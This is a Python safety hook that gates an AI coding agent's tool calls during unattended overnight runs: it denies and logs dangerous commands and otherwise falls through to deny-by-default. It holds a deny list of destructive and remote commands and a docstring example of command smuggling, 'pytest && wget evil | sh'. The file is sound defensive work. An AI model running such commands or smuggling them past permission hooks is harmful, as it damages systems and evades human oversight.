#!/usr/bin/env python3
"""eval-opt Overnight — PreToolUse safety hook.

Runs before the permission prompt. Active ONLY when an eval-opt overnight run is detected (env
EVALOPT_OVERNIGHT truthy, or <cwd>/.evalopt/overnight/ACTIVE exists). Then:
- DENY known-dangerous calls outright (destructive/global/remote/credentialed/sandbox-bypass) and log
- ALLOW known-safe repo-local calls (skips the prompt)
- UNKNOWN calls are NOT pre-approved (emit nothing → fall through to rules/mode; under dontAsk or via
  the PermissionRequest hook they are denied). Never silently allowed.

Output schema (verified vs official docs): hookSpecificOutput.permissionDecision = allow|deny|ask|defer.
Deny rules in settings always take precedence regardless of this hook. No-op when overnight inactive.
"""

from __future__ import annotations

import json
import os
import sys
from datetime import datetime, timezone
from pathlib import Path

_CANDIDATES = [
    os.environ.get("EVALOPT_SRC", ""),
    str(Path(__file__).resolve().parents[3] / "src"),
]
_perm = None
for _p in _CANDIDATES:
    if _p and os.path.isdir(_p):
        sys.path.insert(0, _p)
        try:
            from evalopt_graph import permissions as _perm  # type: ignore

            break
        except Exception:
            _perm = None

if _perm is None:
    try:
        from evalopt_graph import permissions as _perm  # type: ignore
    except Exception:
        _perm = None

_DANGER_FALLBACK = (
    "rm -rf", "git push", "git reset --hard", "git clean", "gh pr create", "gh pr merge",
    "gh release create", "gh workflow run", "npm i -g", "npm install -g", "brew install", "sudo",
    "danger-full-access", "--privileged", "bypasspermissions", "--dangerously-skip-permissions",
    "curl ", "drop table", "truncate", "mkfs", "dd if=",
)

def _overnight_active(cwd: str) -> bool:
    if str(os.environ.get("EVALOPT_OVERNIGHT", "")).lower() in ("1", "true", "yes", "on"):
        return True
    return os.path.isfile(os.path.join(cwd or ".", ".evalopt", "overnight", "ACTIVE"))


def _fallback_output(tool_name: str, tool_input: dict) -> dict:
    """Degraded mode (the evalopt package could not be imported). FAIL CLOSED: only ever DENY a
    known-dangerous command; NEVER emit an explicit `allow` here. A prefix-match allow would
    re-introduce safe-prefix smuggling (`pytest && wget evil | sh`, `pytest; echo x > ~/.claude/…`)
    because it inspects only the command's start. Returning {} lets dontAsk / the PermissionRequest
    hook make the real (deny-by-default) decision."""
    if tool_name in ("Bash", "WorkspaceBash"):
        cmd = str(tool_input.get("command", "")).strip().lower()
        if any(d in cmd for d in _DANGER_FALLBACK):
            return {"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision": "deny",
                                           "permissionDecisionReason": "eval-opt overnight: dangerous command (fallback)"}}
    return {}  # never pre-approve in degraded mode — fall through to deny-by-default


def _log_block(cwd: str, tool_name: str, command: str, reason: str) -> None:
    try:
        odir = os.path.join(cwd or ".", ".evalopt", "overnight")
        os.makedirs(odir, exist_ok=True)
        rec = {"ts": datetime.now(timezone.utc).isoformat(), "tool": tool_name, "command": command,
               "behavior": "deny", "reason": reason, "source": "pretool_safety_hook"}
        with open(os.path.join(odir, "permission_blocks.jsonl"), "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec, default=str) + "\n")
        with open(os.path.join(odir, "blocked_decisions.jsonl"), "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec, default=str) + "\n")
    except Exception:
        pass


def main() -> int:
    try:
        event = json.load(sys.stdin)
    except Exception:
        return 0
    cwd = event.get("cwd") or os.getcwd()
    if not _overnight_active(cwd):
        return 0  # no-op outside overnight mode

    tool_name = event.get("tool_name", "")
    tool_input = event.get("tool_input", {}) or {}

    if _perm is not None:
        out = _perm.pretooluse_output(tool_name, tool_input, repo_path=cwd, cwd=cwd)
    else:
        out = _fallback_output(tool_name, tool_input)

    if out:
        hso = out.get("hookSpecificOutput", {})
        if hso.get("permissionDecision") == "deny":
            _log_block(cwd, tool_name, str(tool_input.get("command", "") or tool_input.get("file_path", "")),
                       hso.get("permissionDecisionReason", "blocked"))
        print(json.dumps(out))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
